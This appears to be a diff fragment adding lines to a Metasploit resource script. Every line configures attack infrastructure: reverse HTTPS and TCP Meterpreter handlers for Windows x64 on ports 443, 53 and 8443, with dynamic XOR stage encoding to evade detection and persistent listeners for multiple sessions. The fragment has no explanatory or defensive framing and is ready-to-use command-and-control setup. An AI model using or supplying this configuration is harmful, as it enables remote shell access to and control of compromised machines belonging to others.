@@ -1,0 +1,7 @@
+handler -H eth0 -P 443 -p windows/x64/meterpreter/reverse_https
+handler -H eth0 -P 53 -p windows/x64/meterpreter/reverse_https
+handler -H eth0 -P 8443 -p windows/x64/meterpreter/reverse_tcp
+set EnableStageEncoding true
+set StageEncoder x64/xor_dynamic
+set EXITFUNC thread
+set ExitOnSession false
